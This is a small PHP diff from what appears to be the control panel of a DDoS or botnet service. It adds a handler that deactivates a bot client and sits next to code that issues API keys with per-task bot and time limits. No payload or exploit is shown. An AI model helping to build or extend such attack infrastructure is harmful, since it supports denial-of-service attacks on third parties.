@@ -34,6 +34,11 @@ class ddosController
     {
         $GLOBALS["template"][1] = "ddoshub";
 
+        if(!empty($_POST["unloadclientfromplugin"]) && !empty($_POST["id"])){
+            $statement = $GLOBALS["pdo"]->prepare("UPDATE ddos_avalible SET active = ? WHERE id = ?");
+            $statement->execute(array(2, $_POST["id"]));
+        }
+
         if (!empty($_POST["maxbots"])) {
             $statement = $GLOBALS["pdo"]->prepare("INSERT INTO ddos_apis (apikey, created_by_user, infotype, max_bots_per_task, max_time_per_task,max_tasks,active) VALUES (?, ?, ?, ?, ?, ?, ?)");
             if($_POST["active"] == "on"){
